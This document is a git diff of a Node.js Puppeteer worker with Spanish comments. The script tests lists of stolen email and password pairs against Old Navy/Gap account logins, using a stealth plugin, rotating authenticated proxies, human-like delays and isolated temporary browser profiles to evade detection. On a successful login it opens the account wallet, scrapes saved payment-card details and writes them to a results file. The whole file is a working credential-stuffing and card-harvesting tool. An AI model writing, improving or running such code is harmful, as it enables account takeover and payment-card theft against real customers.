@@ -1,7 +1,9 @@
 const puppeteer = require('puppeteer-extra');
 const StealthPlugin = require('puppeteer-extra-plugin-stealth');
 const { parentPort, workerData } = require('worker_threads');
-const fs = require('fs');
+const path = require('path');
+const fs = require('fs-extra');
+const os = require('os');
 
 puppeteer.use(StealthPlugin());
 
@@ -46,17 +48,18 @@ async function runWorker(credentials, proxies, useProxies, retryOnFail, humanize
     console.log('Valores recibidos en el worker:', { useProxies, retryOnFail, humanizedMode });
     let proxyIndex = 0;
     const results = [];
+    
+
 
     for (let i = 0; i < credentials.length; i++) {
         await checkPaused();
-        console.log('bucle valor de i  ',i);
 
         const { email, password } = credentials[i];
         parentPort.postMessage(`Verificando: ${email}`);
 
+        // Crear un nuevo contexto de navegador para aislar la sesión
         let proxy = useProxies && proxies.length > 0 ? proxies[proxyIndex] : null;
-        let { browser, page } = await createBrowserInstance(proxy);
-        let isBanned =false;
+        let { browser, page, userDataDir } = await createBrowserInstance(proxy);
 
         try {
             await page.goto('https://secure-oldnavy.gap.com/my-account/sign-in', { waitUntil: 'domcontentloaded' });
@@ -73,14 +76,11 @@ async function runWorker(credentials, proxies, useProxies, retryOnFail, humanize
                 throw new Error('IP bloqueada');
             }
 
-            // Espera a que el campo de correo electrónico esté presente en la página
             await page.waitForSelector('#verify-account-email');
             
-            // Introducción del correo electrónico
             await page.type('#verify-account-email', email, { delay: humanizedMode ? randomDelay(100, 400) : randomDelay(50, 150) });
             await checkPaused();
 
-            // Modo Humanizado
             if (humanizedMode) {
                 await simulateHumanClick(page, '.loyalty-email-button');
             } else {
@@ -95,8 +95,6 @@ async function runWorker(credentials, proxies, useProxies, retryOnFail, humanize
                 throw new Error('IP bloqueada');
             }
 
-            
-
             const navigationResult = await Promise.race([
                 page.waitForSelector('#create-account-first-name', { timeout: humanizedMode ? 15000 : 10000 }).then(() => 'register'),
                 page.waitForSelector('input[name="password"]', { timeout: humanizedMode ? 15000 : 10000 }).then(() => 'login'),
@@ -105,7 +103,6 @@ async function runWorker(credentials, proxies, useProxies, retryOnFail, humanize
             await checkPaused();
             if (navigationResult === 'register') {
                 parentPort.postMessage('El correo no está registrado.');
-                await browser.close();
                 continue;
             }
 
@@ -119,7 +116,6 @@ async function runWorker(credentials, proxies, useProxies, retryOnFail, humanize
                     await signInButtonSelector.click();
                 } else {
                     parentPort.postMessage('El botón de inicio de sesión no se encontró.');
-                    await browser.close();
                     continue;
                 }
 
@@ -131,7 +127,6 @@ async function runWorker(credentials, proxies, useProxies, retryOnFail, humanize
                 ).catch(() => false);
                 if (passwordError) {
                     parentPort.postMessage('Contraseña incorrecta. Cerrando navegador.');
-                    await browser.close();
                     continue;
                 }
 
@@ -142,11 +137,8 @@ async function runWorker(credentials, proxies, useProxies, retryOnFail, humanize
             
                 if (protectYourAccountDialog) {
                     parentPort.postMessage('Usuario pide confirmación Email. Cerrando navegador.');
-                    await browser.close();
                     continue;
                 }
-
-
 
                 await page.waitForSelector('.redesign-sidebar-nav-section-header-title', { timeout: humanizedMode ? 15000 : 10000 });
                 parentPort.postMessage('Inicio de sesión exitoso.');
@@ -162,14 +154,12 @@ async function runWorker(credentials, proxies, useProxies, retryOnFail, humanize
                     const xpath = '//h1[@class="wallet-no-credit-cards-header"]';
                     const result = document.evaluate(xpath, document, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null);
                     const h1Element = result.singleNodeValue;
-                    return !!h1Element; // Devuelve true si el elemento existe
+                    return !!h1Element; 
                 });
                 if (h1Detected) {
                     parentPort.postMessage('No se encontraron tarjetas guardadas.');
-                    await browser.close();
                     continue;
                 }
-
 
                 await page.waitForSelector('.wallet-credit-card-edit', { timeout: humanizedMode ? 15000 : 10000 });
                 parentPort.postMessage('Tarjetas encontradas.');
@@ -185,7 +175,6 @@ async function runWorker(credentials, proxies, useProxies, retryOnFail, humanize
                     await checkPaused();
 
                     const formHTML = await page.evaluate(() => document.querySelector('.add-payment-form').innerHTML);
-                    parentPort.postMessage(`HTML del formulario de la tarjeta ${index + 1}:`);
 
                     try {
                         const cardData = extractCardData(formHTML);
@@ -201,18 +190,25 @@ async function runWorker(credentials, proxies, useProxies, retryOnFail, humanize
             } else {
                 parentPort.postMessage('No se pudo determinar el estado del correo.');
             }
-        } catch (error) {
-            i=await handleWorkerError(error, { useProxies, proxies, retryOnFail, i, proxyIndex, credentials, browser });
-           
-        }
 
-        await browser.close();
+        } catch (error) {
+            i = await handleWorkerError(error, { useProxies, proxies, retryOnFail, i, proxyIndex, credentials, browser });
+        } finally {
+            await page.close(); // Asegura el cierre de la página
+            await browser.close(); // Asegura el cierre del navegador
+            fs.removeSync(userDataDir); // Limpia el directorio temporal
+        }
     }
 
+    await browser.close();  // Cierra el navegador al finalizar todo
     fs.writeFileSync(`resultados-worker-${process.pid}.json`, JSON.stringify(results, null, 2));
     await checkPaused();
     parentPort.postMessage('Worker ha finalizado todas las tareas.');
 }
+
+
+
+
 
 async function createBrowserInstance(proxy) {
     const args = [
@@ -225,7 +221,7 @@ async function createBrowserInstance(proxy) {
         '--disable-infobars',
         '--window-size=1280,800',
         '--disable-accelerated-2d-canvas', 
-        '--disable-gpu', 
+        '--disable-gpu',
     ];
 
     let proxyAuth;
@@ -234,52 +230,47 @@ async function createBrowserInstance(proxy) {
     if (proxy) {
         const proxyParts = proxy.split(':');
 
-        // Loguea las partes del proxy
-        parentPort.postMessage(`Partes del proxy: ${JSON.stringify(proxyParts)}`);
-
         if (proxyParts.length === 2) {
-            // Formato: host:port
             proxyUrl = `http://${proxy}`;
-            parentPort.postMessage(`Formato básico: ${proxyUrl}`);
         } else if (proxyParts.length === 4) {
-            // Formato: host:port:username:password
             proxyUrl = `http://${proxyParts[0]}:${proxyParts[1]}`;
             proxyAuth = {
-                username: proxyParts[2], // No uses encodeURIComponent aquí
+                username: proxyParts[2],
                 password: proxyParts[3]
             };
-            parentPort.postMessage(`Formato con autenticación: ${proxyUrl}`);
         } else {
             parentPort.postMessage("Formato de proxy inválido. Se espera: host:port o host:port:username:password");
             return;
         }
 
         args.push(`--proxy-server=${proxyUrl}`);
-        parentPort.postMessage(`Usando proxy: ${proxyUrl}`);
-    } else {
-        console.log('no se usa proxy');
     }
 
     try {
+        // Crear un directorio temporal para el perfil del navegador
+        const userDataDir = path.join(os.tmpdir(), `puppeteer_profile_${Date.now()}`);
+        fs.ensureDirSync(userDataDir);
+
         const browser = await puppeteer.launch({
             headless: workerData.useHeadless,
             args: args,
+            userDataDir, // Utiliza el perfil temporal
         });
 
         const page = await browser.newPage();
 
         if (proxyAuth) {
             await page.authenticate(proxyAuth);
-            parentPort.postMessage(`Autenticación utilizada: ${proxyAuth.username}:${proxyAuth.password}`);
         }
 
-        return { browser, page };
+        return { browser, page, userDataDir }; // Devuelve el navegador, la página, y el perfil temporal
 
     } catch (error) {
         console.error("Error al crear la instancia del navegador:", error.message);
-        throw error; 
+        throw error;
     }
 }
+
 
 function randomDelay(min, max) {
     return Math.floor(Math.random() * (max - min + 1)) + min;
